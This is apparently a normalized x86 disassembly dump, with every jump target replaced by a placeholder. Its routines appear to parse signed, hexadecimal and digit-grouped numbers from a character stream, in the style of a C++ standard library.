mov ecx [ ebp - 0x6c ]
mov esi eax
call sub_10005f4d
mov [ ebp - 0x76 ] 0x1
cmp [ esi ] ax
je r-xdata
push [ ebp - 0x74 ]
push [ ebp - 0x6c ]
call sub_1000674b
pop ecx
pop ecx
test al al
jne r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x8 ]
movzx eax ax
mov [ ebp - 0xb8 ] eax
cmp ax si
je r-xdata
mov ecx [ ebp - 0x6c ]
call sub_10006020
lea eax [ ebp - 0xc8 ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_10007e38
push eax
lea ecx [ ebp - 0x98 ]
call sub_10006cba
test al al
je r-xdata
lea eax [ ebp - 0xc0 ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_10007e38
push eax
lea ecx [ ebp - 0x98 ]
call sub_10006cba
test al al
je r-xdata
cmp [ ebp - 0x14 ] 0x8
mov esi [ ebp - 0x28 ]
jae r-xdata
test [ ebp - 0x70 ] 0x2
mov [ ebp - 0x4 ] 0x3
je r-xdata
and [ ebp - 0x70 ] 0xfffffffb
push esi
push 0x1
lea ecx [ ebp - 0xec ]
call sub_1000264e
xor esi esi
test [ ebp - 0x70 ] 0x4
je r-xdata
mov ecx [ ebp - 0x6c ]
call sub_10005f4d
cmp [ ebp - 0x80 ] ax
ja r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x4 ]
push [ ebp - 0x74 ]
mov edi [ ebp - 0x6c ]
push edi
movzx esi ax
call sub_1000674b
pop ecx
pop ecx
test al al
je r-xdata
cmp [ ebp - 0x4c ] 0x10
mov eax [ ebp - 0x60 ]
jae r-xdata
lea ecx [ ebp - 0x98 ]
call sub_10006f37
mov ecx [ ebp - 0x6c ]
mov esi eax
call sub_10005f4d
cmp ax [ esi ]
jne r-xdata
push 0x0
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x65 ] 0x1
mov ecx [ ebp - 0x6c ]
call sub_10005f4d
cmp ax [ esi ]
je r-xdata
lea esi [ ebp - 0x28 ]
cmp [ ebp - 0x76 ] 0x0
je r-xdata
and [ ebp - 0x70 ] 0xfffffffd
push esi
push 0x1
lea ecx [ ebp - 0x124 ]
call sub_1000264e
mov ecx [ ebp - 0x6c ]
call sub_10005f4d
movzx ecx [ ebp - 0x80 ]
movzx eax ax
add ecx 0x9
cmp eax ecx
jg r-xdata
mov edi [ ebp - 0x7c ]
cmp [ edi + 0x14 ] 0x0
jne r-xdata
test si si
je r-xdata
cmp [ eax ] 0x7f
jae r-xdata
lea eax [ ebp - 0x60 ]
lea ecx [ ebp - 0x98 ]
call sub_10006d3f
mov ecx [ ebp - 0x6c ]
call sub_10006020
lea eax [ ebp - 0x140 ]
push eax
mov ecx ebx
call sub_1004317c
or [ ebp - 0x70 ] 0x8
mov [ ebp - 0x4 ] 0x8
cmp [ eax + 0x14 ] esi
jbe r-xdata
mov ecx [ ebp - 0x6c ]
call sub_10006020
lea eax [ ebp - 0x15c ]
push eax
mov ecx ebx
call sub_10043240
push 0xffffffff
push esi
push eax
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x7
call sub_1000253c
push esi
lea ecx [ ebp - 0x15c ]
jmp r-xdata
mov ecx [ ebp - 0x6c ]
call sub_10005f4d
mov ecx [ ebp - 0x7c ]
movzx eax ax
push eax
push 0x1
call sub_10005db8
mov ecx [ ebp - 0x6c ]
call sub_10006020
mov esi [ ebp - 0x9c ]
cmp [ ebp - 0x84 ] esi
jge r-xdata
mov [ ebp - 0x65 ] 0x1
jmp r-xdata
mov ecx edi
call sub_10005f4d
cmp ax si
jne r-xdata
xor edi edi
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10005cd0
push [ ebp - 0x74 ]
mov esi [ ebp - 0x6c ]
push esi
mov [ ebp - 0x4 ] 0xc
call sub_1000674b
pop ecx
pop ecx
test al al
je r-xdata
xor bl bl
lea eax [ ebp - 0x108 ]
push eax
mov ecx ebx
call sub_1004317c
or [ ebp - 0x70 ] 0x10
push esi
mov ecx eax
mov [ ebp - 0x4 ] 0x9
call sub_100230f0
mov ecx [ ebp - 0x6c ]
mov esi eax
call sub_10005f4d
cmp [ esi ] ax
jne r-xdata
push 0x1
mov [ ebp - 0x4 ] 0x3
call sub_1000264e
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0x3
call sub_100020e2
jmp r-xdata
sub esi [ ebp - 0x84 ]
jmp r-xdata
cmp [ ebp - 0x4c ] 0x10
mov esi [ ebp - 0x60 ]
jae r-xdata
mov ecx esi
call sub_10005f4d
cmp [ ebp - 0x80 ] ax
ja r-xdata
test [ ebp - 0x70 ] 0x8
mov [ ebp - 0x4 ] 0x3
je r-xdata
and [ ebp - 0x70 ] 0xffffffef
push 0x0
push 0x1
lea ecx [ ebp - 0x108 ]
call sub_1000264e
mov bl 0x1
jmp r-xdata
push [ ebp - 0x80 ]
mov ecx edi
push 0x1
call sub_10005db8
dec esi
jne r-xdata
jmp r-xdata
mov ecx edi
call sub_10006020
push [ ebp - 0x74 ]
push edi
call sub_1000674b
pop ecx
pop ecx
test al al
jne r-xdata
cmp [ ebp - 0x65 ] 0x0
jne r-xdata
lea esi [ ebp - 0x60 ]
push edi
lea ecx [ ebp - 0x2c ]
call sub_10005d90
cmp [ eax ] 0x0
je r-xdata
mov ecx esi
call sub_10005f4d
movzx ecx [ ebp - 0x80 ]
movzx eax ax
add ecx 0x9
cmp eax ecx
jg r-xdata
test bl bl
je r-xdata
and [ ebp - 0x70 ] 0xfffffff7
push 0x0
push 0x1
lea ecx [ ebp - 0x140 ]
call sub_1000264e
test [ ebp - 0x70 ] 0x10
je r-xdata
mov eax [ ebp - 0x84 ]
cmp eax [ ebp - 0x9c ]
jge r-xdata
mov eax [ ebp - 0x9c ]
cmp [ ebp - 0x84 ] eax
jge r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100020e2
test edi edi
jbe r-xdata
test edi edi
je r-xdata
mov ecx esi
call sub_10005f4d
cmp ax [ ebp - 0xb8 ]
jne r-xdata
mov ecx esi
call sub_10005f4d
mov ecx [ ebp - 0x7c ]
movzx eax ax
push eax
push 0x1
call sub_10005db8
push edi
lea ecx [ ebp - 0x2c ]
call sub_10005d90
cmp [ eax ] 0x7f
je r-xdata
mov ecx [ ebp - 0x6c ]
call sub_10006020
mov ecx [ ebp - 0xa0 ]
lea eax [ ebp - 0x178 ]
push eax
call sub_1004317c
push 0xffffffff
push 0x0
push eax
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0xa
call sub_1000253c
push 0x0
push 0x1
lea ecx [ ebp - 0x178 ]
mov [ ebp - 0x4 ] 0x3
call sub_1000264e
mov [ ebp - 0x75 ] 0x1
jmp r-xdata
mov ecx edi
call sub_10005f4d
cmp [ ebp - 0x80 ] ax
ja r-xdata
mov [ ebp - 0x65 ] 0x1
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0xb
call sub_100020e2
jmp r-xdata
cmp [ esi ] 0x7f
je r-xdata
push edi
lea ecx [ ebp - 0x2c ]
call sub_10005d90
cmp [ eax ] 0x0
jle r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100014aa
inc edi
mov ecx esi
call sub_10006020
push [ ebp - 0x74 ]
push esi
call sub_1000674b
pop ecx
pop ecx
test al al
jne r-xdata
push edi
lea ecx [ ebp - 0x2c ]
call sub_10005d90
inc [ eax ]
jmp r-xdata
mov ecx edi
call sub_10005f4d
movzx ecx [ ebp - 0x80 ]
movzx eax ax
add ecx 0x9
cmp eax ecx
jg r-xdata
dec edi
je r-xdata
mov [ ebp - 0x65 ] 0x1
inc edi
jmp r-xdata
mov ecx edi
call sub_10005f4d
mov ecx [ ebp - 0x7c ]
movzx eax ax
push eax
push 0x1
call sub_10005db8
inc [ ebp - 0x84 ]
test edi edi
jne r-xdata
push edi
lea ecx [ ebp - 0x2c ]
call sub_10005d90
mov cl [ esi ]
cmp cl [ eax ]
jne r-xdata
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
push edi
lea ecx [ ebp - 0x2c ]
call sub_10005d90
mov cl [ esi ]
cmp cl [ eax ]
jl r-xdata
mov [ ebp - 0x65 ] 0x1
mov esi eax
jmp r-xdata
sub_10045e12
push 0x11c
mov eax sub_1004f0e8
call sub_1002b30f
mov eax [ ebp + 0x8 ]
mov esi ecx
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0x84 ] eax
mov [ ebp - 0x74 ] ecx
xor edi edi
cmp [ ebp + 0x14 ] 0x0
mov [ ebp - 0x4 ] edi
je r-xdata
lea eax [ ebp - 0x8c ]
push eax
call sub_10007dd5
push eax
mov [ ebp - 0x4 ] 0x2
call sub_10044b37
pop ecx
lea ecx [ ebp - 0x8c ]
lea eax [ ebp - 0x88 ]
push eax
call sub_10007dd5
push eax
mov [ ebp - 0x4 ] 0x1
call sub_10044bd4
pop ecx
lea ecx [ ebp - 0x88 ]
jmp r-xdata
mov [ ebp - 0x6c ] eax
mov eax [ ebp + 0x38 ]
cmp eax [ ebp - 0x6c ]
ja r-xdata
neg eax
mov [ ebp - 0x4 ] 0x0
mov ebx eax
call sub_10007dbd
add esi 0x8
push esi
push edi
push 0x30
call sub_10007340
movzx esi ax
add esp 0xc
lea eax [ ebp - 0x2c ]
push eax
mov ecx ebx
mov [ ebp - 0x78 ] esi
call sub_10043163
mov eax [ ebx ]
mov ecx ebx
mov [ ebp - 0x4 ] 0x3
call [ eax + 0x1c ]
cmp eax edi
jge r-xdata
cmp [ ebp - 0x14 ] 0x10
mov eax [ ebp - 0x28 ]
jae r-xdata
mov ecx [ ebp - 0x6c ]
sub ecx eax
push esi
inc ecx
push ecx
push edi
lea ecx [ ebp + 0x24 ]
call sub_100432ab
jmp r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x28 ]
lea ecx [ ebp - 0x48 ]
call sub_10001bdf
cmp [ ebp + 0x20 ] 0x0
mov eax [ ebx ]
lea ecx [ ebp - 0x70 ]
push ecx
mov [ ebp - 0x4 ] 0x4
mov ecx ebx
je r-xdata
cmp [ ebp - 0x14 ] 0x10
mov eax [ ebp - 0x28 ]
jae r-xdata
call [ eax + 0x20 ]
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x70 ] eax
lea eax [ ebp - 0xc0 ]
push eax
mov ecx ebx
call sub_10043240
mov [ ebp - 0x4 ] 0x6
call [ eax + 0x24 ]
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x70 ] eax
lea eax [ ebp - 0xc0 ]
push eax
mov ecx ebx
call sub_1004317c
mov [ ebp - 0x4 ] 0x5
jmp r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x28 ]
xor esi esi
mov [ ebp - 0x65 ] 0x0
xor ecx ecx
lea eax [ ebp - 0xc0 ]
push eax
mov ecx ebx
call sub_1003f21b
push 0xffffffff
push edi
push eax
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0x8
call sub_1000253c
push edi
push 0x1
lea ecx [ ebp - 0xc0 ]
mov [ ebp - 0x4 ] 0x7
call sub_1000264e
push 0xffffffff
push edi
push eax
lea ecx [ ebp - 0x48 ]
call sub_1000253c
push edi
push 0x1
lea ecx [ ebp - 0xc0 ]
call sub_1000264e
lea ecx [ ebp - 0x64 ]
call sub_10001bdf
mov eax [ ebp - 0x74 ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] 0x7
test al 0x8
je r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x8 ]
cmp [ ebp - 0x14 ] 0x10
mov edi [ ebp - 0x28 ]
movzx eax ax
mov [ ebp - 0x70 ] eax
jae r-xdata
inc esi
sub eax 0x4
je r-xdata
mov esi [ ebp + 0x38 ]
sub esi [ ebp - 0x6c ]
jmp r-xdata
lea edi [ ebp - 0x28 ]
inc ecx
cmp ecx 0x4
jb r-xdata
mov [ ebp - 0x65 ] 0x1
add esi [ ebp - 0x50 ]
jmp r-xdata
sub eax 0x7
je r-xdata
mov al [ edi ]
cmp al 0x7f
jne r-xdata
movsx eax [ ebp + ecx - 0x70 ]
sub eax 0x20
je r-xdata
mov ecx [ ebp - 0x74 ]
mov eax [ ecx + 0x18 ]
cmp eax edi
jle r-xdata
add esi [ ebp - 0x34 ]
jmp r-xdata
sub eax 0x4b
je r-xdata
test al al
jle r-xdata
xor edi edi
xor esi esi
cmp eax esi
jbe r-xdata
mov edx [ ebp - 0x6c ]
cmp [ ebp + 0x38 ] edx
ja r-xdata
dec eax
dec eax
je r-xdata
movsx eax al
cmp eax esi
jae r-xdata
and [ ebp - 0x7c ] 0x0
cmp edi 0x100
jne r-xdata
sub eax esi
mov esi eax
jmp r-xdata
xor eax eax
mov eax edx
sub eax [ ebp + 0x38 ]
inc eax
jmp r-xdata
cmp ecx 0x3
je r-xdata
jmp r-xdata
push [ ebp - 0x70 ]
sub esi eax
push 0x1
push esi
lea ecx [ ebp + 0x24 ]
call sub_100432ab
lea eax [ edi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
push 0x1
push [ ebp + 0x1c ]
lea eax [ ebp - 0x94 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10042631
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x14
mov [ ebp + 0x10 ] eax
sub eax 0x4
je r-xdata
push esi
push [ ebp + 0x1c ]
lea eax [ ebp - 0x80 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10042631
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x14
mov [ ebp + 0x10 ] eax
xor esi esi
cmp [ ebp - 0x65 ] 0x0
jne r-xdata
mov edi [ ecx + 0x10 ]
and edi 0x1c0
cmp edi 0x40
je r-xdata
xor edi edi
cmp edi edx
sbb edx edx
neg edx
add edx [ ebp + 0x38 ]
add edx eax
add esi edx
jmp r-xdata
mov edi eax
inc [ ebp - 0x7c ]
cmp [ ebp - 0x7c ] 0x4
jb r-xdata
push esi
push [ ebp + 0x1c ]
lea eax [ ebp - 0xa4 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10042631
add esp 0x14
xor esi esi
lea eax [ ebp - 0x110 ]
push eax
lea ecx [ ebp - 0x64 ]
call sub_10009d44
push [ ebp - 0x50 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x9c ]
jmp r-xdata
sub eax 0x7
je r-xdata
mov eax [ ebp - 0x7c ]
movsx eax [ ebp + eax - 0x70 ]
sub eax 0x20
je r-xdata
xor edi edi
inc edi
cmp [ ebp - 0x34 ] edi
jbe r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_100425f5
add esp 0x18
jmp r-xdata
cmp [ ebp - 0x34 ] 0x0
jbe r-xdata
sub eax 0x4b
je r-xdata
mov eax [ ebp - 0x74 ]
and [ eax + 0x18 ] 0x0
push esi
push [ ebp + 0x1c ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp - 0x84 ]
call sub_10042631
add esp 0x14
xor esi esi
push esi
push edi
lea ecx [ ebp - 0x64 ]
call sub_1000264e
push esi
push edi
lea ecx [ ebp - 0x48 ]
call sub_1000264e
push esi
push edi
lea ecx [ ebp - 0x2c ]
call sub_100020e2
push esi
push edi
lea ecx [ ebp + 0x24 ]
call sub_1000264e
mov eax [ ebp - 0x84 ]
call sub_1002b392
retn 0x38
push edi
lea eax [ ebp - 0xa4 ]
push eax
lea eax [ ebp - 0x94 ]
push eax
lea ecx [ ebp - 0x48 ]
call sub_10009d44
mov ecx eax
call sub_10018e85
mov ecx [ ebp - 0x34 ]
dec ecx
push ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x9c ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_100425f5
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x18
mov [ ebp + 0x10 ] eax
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
lea eax [ ebp - 0x120 ]
push eax
lea ecx [ ebp - 0x48 ]
call sub_10009d44
push 0x1
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0xf0 ]
jmp r-xdata
mov eax [ ebp - 0x6c ]
test eax eax
jne r-xdata
dec eax
dec eax
je r-xdata
cmp [ ebp + 0x38 ] eax
ja r-xdata
lea eax [ ebp - 0x108 ]
push eax
lea ecx [ ebp + 0x24 ]
call sub_10009d44
push [ ebp + 0x38 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0xd0 ]
cmp edi 0x100
jne r-xdata
jmp r-xdata
lea eax [ ebp - 0xc8 ]
push eax
lea ecx [ ebp + 0x24 ]
call sub_10009d44
mov ecx [ ebp + 0x38 ]
sub ecx [ ebp - 0x6c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x118 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_100425f5
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
mov eax [ ebx ]
add esp 0x18
mov ecx ebx
call [ eax + 0x4 ]
movzx eax ax
push eax
lea ecx [ ebp + 0xc ]
call sub_10005f27
push [ ebp - 0x6c ]
lea eax [ ebp - 0x128 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
lea ecx [ ebp + 0x24 ]
call sub_10007e38
mov ecx eax
call sub_10024f40
push [ ebp - 0x6c ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0xe0 ]
jmp r-xdata
push [ ebp - 0x78 ]
lea ecx [ ebp + 0xc ]
call sub_10005f27
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x4 ]
movzx eax ax
push eax
lea ecx [ ebp + 0xc ]
call sub_10005f27
mov eax [ ebp - 0x6c ]
sub eax [ ebp + 0x38 ]
push eax
push [ ebp - 0x78 ]
lea eax [ ebp - 0xd8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10042631
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
add esp 0x14
lea eax [ ebp - 0xe8 ]
push eax
lea ecx [ ebp + 0x24 ]
call sub_10009d44
push [ ebp + 0x38 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0xf8 ]
jmp r-xdata
sub_10046360
push 0x10
mov eax sub_1004f110
call sub_1002b2d9
mov esi ecx
mov [ ebp - 0x14 ] esi
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
call sub_10007876
mov ecx [ eax ]
lea edi [ esi + 0x14 ]
mov [ edi ] ecx
mov eax [ eax + 0x4 ]
mov ecx [ ebp + 0x8 ]
xor ebx ebx
mov [ edi + 0x4 ] eax
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ ebp - 0x4 ] ebx
call sub_100453cd
push edi
push ebx
push eax
call sub_10006f91
mov ecx [ ebp + 0x8 ]
add esp 0xc
mov [ esi + 0x8 ] eax
call sub_1004540c
push edi
push ebx
push eax
call sub_10006f91
add esp 0xc
mov [ esi + 0xc ] eax
call sub_1004de44
mov [ esi + 0x10 ] eax
call sub_1002b37e
retn 0x4
sub_100463e3
push 0x64
mov eax sub_1004ff83
call sub_1002b30f
mov eax [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0x10 ]
mov [ ebp - 0x6c ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp + 0x1c ]
push eax
call sub_10044e48
mov ebx eax
pop ecx
lea eax [ ebp - 0x48 ]
push eax
mov ecx ebx
call sub_10043163
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x34 ] eax
je r-xdata
lea ebx [ esi + 0x8 ]
push ebx
push 0x0
push 0x30
mov [ ebp - 0x68 ] eax
mov [ ebp - 0x60 ] ebx
call sub_1004158d
mov esi [ ebp - 0x6c ]
add esp 0xc
push [ ebp - 0x5c ]
movzx eax ax
mov ecx edi
mov [ ebp - 0x64 ] eax
mov [ ebp - 0x54 ] esi
call sub_10042bc0
test al al
jne r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x8 ]
movzx eax ax
mov eax [ ebp + 0x18 ]
and eax 0xe00
cmp eax 0x400
jne r-xdata
push ebx
push 0x0
push 0x2b
call sub_1004158d
add esp 0xc
mov ecx edi
mov bx ax
call sub_10042d3e
cmp ax bx
jne r-xdata
cmp eax 0x800
jne r-xdata
mov [ ebp - 0x50 ] 0x8
jmp r-xdata
push [ ebp - 0x60 ]
push 0x0
push 0x2d
call sub_1004158d
add esp 0xc
mov ecx edi
mov bx ax
call sub_10042d3e
cmp ax bx
jne r-xdata
mov [ esi ] 0x2b
jmp r-xdata
neg eax
sbb eax eax
and eax 0xa
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x50 ] 0x10
jmp r-xdata
push [ ebp - 0x5c ]
mov [ ebp - 0x58 ] 0x0
push edi
mov [ ebp - 0x49 ] 0x0
call sub_10042f92
pop ecx
pop ecx
test al al
je r-xdata
mov [ esi ] 0x2d
lea eax [ esi + 0x1 ]
mov ecx edi
mov [ ebp - 0x54 ] eax
call sub_10042ae0
cmp [ ebp - 0x50 ] 0x0
je r-xdata
mov ecx edi
call sub_10042d3e
cmp ax [ ebp - 0x64 ]
jne r-xdata
mov [ ebp - 0x64 ] 0xa
cmp [ ebp - 0x50 ] 0xa
je r-xdata
mov ecx edi
mov [ ebp - 0x58 ] 0x1
call sub_10042ae0
push [ ebp - 0x5c ]
push edi
call sub_10042f92
pop ecx
pop ecx
test al al
je r-xdata
cmp [ ebp - 0x30 ] 0x10
mov esi [ ebp - 0x44 ]
jae r-xdata
push [ ebp - 0x60 ]
mov ecx edi
call sub_10042d3e
movzx eax ax
push eax
call sub_10041edf
mov esi [ ebp - 0x54 ]
push [ ebp - 0x64 ]
mov [ esi ] al
movsx eax al
push eax
push r--data
call sub_10027b60
add esp 0x14
test eax eax
je r-xdata
xor eax eax
cmp [ ebp - 0x50 ] 0x8
setne al
dec eax
and eax 0xfffffff2
add eax 0x16
mov [ ebp - 0x64 ] eax
jmp r-xdata
cmp [ ebp - 0x50 ] 0x0
jne r-xdata
push [ ebp - 0x60 ]
push 0x0
push 0x78
call sub_1004158d
add esp 0xc
mov ecx edi
mov bx ax
call sub_10042d3e
cmp ax bx
je r-xdata
cmp [ ebp - 0x58 ] 0x0
je r-xdata
lea esi [ ebp - 0x44 ]
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10005d90
cmp [ eax ] 0x0
je r-xdata
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
push [ ebp - 0x58 ]
lea ecx [ ebp - 0x2c ]
push 0x1
call sub_10005cd0
push [ ebp - 0x5c ]
add esi 0x1f
push edi
mov [ ebp - 0x4 ] 0x1
xor ebx ebx
mov [ ebp - 0x70 ] esi
call sub_10042f92
pop ecx
pop ecx
test al al
je r-xdata
mov [ ebp - 0x50 ] 0x8
cmp [ ebp - 0x50 ] 0x0
je r-xdata
push [ ebp - 0x60 ]
push 0x0
push 0x58
call sub_1004158d
add esp 0xc
mov ecx edi
mov bx ax
call sub_10042d3e
cmp ax bx
jne r-xdata
mov eax [ ebp - 0x6c ]
mov [ ebp - 0x54 ] eax
test ebx ebx
jbe r-xdata
test ebx ebx
je r-xdata
cmp [ ebp - 0x68 ] 0x0
je r-xdata
cmp esi [ ebp - 0x70 ]
jae r-xdata
cmp [ esi ] 0x30
je r-xdata
mov ecx edi
mov [ ebp - 0x50 ] 0x10
mov [ ebp - 0x58 ] 0x0
call sub_10042ae0
jmp r-xdata
cmp [ ebp - 0x50 ] 0x10
jne r-xdata
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
cmp [ esi ] 0x7f
je r-xdata
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10005d90
cmp [ eax ] 0x0
jle r-xdata
mov ecx edi
call sub_10042d3e
cmp ax [ ebp - 0x68 ]
jne r-xdata
push ebx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x58 ] 0x1
call sub_10005d90
cmp [ eax ] 0x7f
je r-xdata
inc esi
mov [ ebp - 0x54 ] esi
mov [ ebp - 0x49 ] 0x1
mov eax [ ebp - 0x54 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ eax ] 0x0
call sub_100020e2
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_100020e2
mov eax [ ebp - 0x50 ]
call sub_1002b392
retn
mov eax [ ebp - 0x54 ]
inc [ ebp - 0x54 ]
mov [ eax ] 0x30
jmp r-xdata
dec ebx
je r-xdata
mov [ ebp - 0x58 ] 0x0
inc ebx
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100014aa
inc ebx
mov ecx edi
call sub_10042ae0
push [ ebp - 0x5c ]
push edi
call sub_10042f92
pop ecx
pop ecx
test al al
jne r-xdata
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10005d90
inc [ eax ]
jmp r-xdata
test ebx ebx
jne r-xdata
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10005d90
mov cl [ esi ]
cmp cl [ eax ]
jne r-xdata
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10005d90
mov cl [ esi ]
cmp cl [ eax ]
jl r-xdata
mov esi eax
jmp r-xdata
sub_10046733
push 0x60
mov eax sub_1004ff4e
call sub_1002b30f
mov eax [ ebp + 0x14 ]
mov ebx [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp + 0x18 ]
push eax
mov [ ebp - 0x68 ] ebx
call sub_10044e48
pop ecx
mov ecx eax
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x6c ] ecx
call sub_10043163
and [ ebp - 0x4 ] 0x0
add edi 0x8
push edi
push 0x0
push 0x30
mov [ ebp - 0x64 ] edi
call sub_1004158d
add esp 0xc
push [ ebp - 0x58 ]
movzx eax ax
mov ecx esi
mov [ ebp - 0x54 ] eax
mov [ ebp - 0x4a ] 0x0
call sub_10042bc0
test al al
jne r-xdata
and [ ebp - 0x50 ] 0x0
and [ ebp - 0x60 ] 0x0
cmp [ ebp - 0x14 ] 0x10
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x49 ] 0x0
jae r-xdata
push edi
push 0x0
push 0x2b
call sub_1004158d
add esp 0xc
mov ecx esi
mov di ax
call sub_10042d3e
cmp ax di
jne r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x28 ]
push [ ebp - 0x64 ]
push 0x0
push 0x2d
call sub_1004158d
add esp 0xc
mov ecx esi
mov di ax
call sub_10042d3e
cmp ax di
jne r-xdata
mov [ ebx ] 0x2b
jmp r-xdata
push [ ebp - 0x58 ]
push esi
call sub_10042f92
pop ecx
pop ecx
test al al
je r-xdata
cmp [ ebp - 0x14 ] 0x10
mov eax [ ebp - 0x28 ]
jae r-xdata
mov ebx [ ebp - 0x68 ]
mov [ ebx ] 0x2d
mov ecx esi
inc ebx
call sub_10042ae0
push [ ebp - 0x58 ]
push esi
call sub_10042f92
pop ecx
pop ecx
test al al
je r-xdata
mov ecx esi
call sub_10042d3e
cmp [ ebp - 0x54 ] ax
ja r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x28 ]
cmp [ ebp - 0x50 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x6c ]
mov eax [ ecx ]
call [ eax + 0x4 ]
mov ecx esi
movzx edi ax
call sub_10042d3e
cmp ax di
jne r-xdata
cmp [ ebp - 0x49 ] 0x0
je r-xdata
mov ecx esi
call sub_10042d3e
movzx ecx [ ebp - 0x54 ]
movzx eax ax
add ecx 0x9
cmp eax ecx
jg r-xdata
mov ecx [ ebp - 0x6c ]
mov eax [ ecx ]
call [ eax + 0x8 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
movzx edi ax
call sub_10005cd0
push [ ebp - 0x58 ]
and [ ebp - 0x5c ] 0x0
push esi
mov [ ebp - 0x4 ] 0x1
call sub_10042f92
pop ecx
pop ecx
test al al
je r-xdata
push [ ebp - 0x58 ]
push esi
call sub_10042f92
pop ecx
pop ecx
test al al
jne r-xdata
jmp r-xdata
call sub_10027b31
mov eax [ eax ]
mov al [ eax ]
mov [ ebx ] al
mov ecx esi
inc ebx
call sub_10042ae0
cmp [ ebp - 0x50 ] 0x0
jne r-xdata
cmp [ ebp - 0x50 ] 0x24
jl r-xdata
cmp [ ebp - 0x14 ] 0x10
mov edi [ ebp - 0x28 ]
jae r-xdata
mov ecx esi
call sub_10042d3e
cmp [ ebp - 0x54 ] ax
ja r-xdata
mov ecx esi
call sub_10042d3e
cmp [ ebp - 0x54 ] ax
ja r-xdata
cmp [ ebp - 0x49 ] 0x0
je r-xdata
push [ ebp - 0x58 ]
push esi
call sub_10042f92
pop ecx
pop ecx
test al al
jne r-xdata
mov [ ebx ] 0x30
inc ebx
mov ecx esi
call sub_10042d3e
cmp ax [ ebp - 0x54 ]
jne r-xdata
inc [ ebp - 0x60 ]
jmp r-xdata
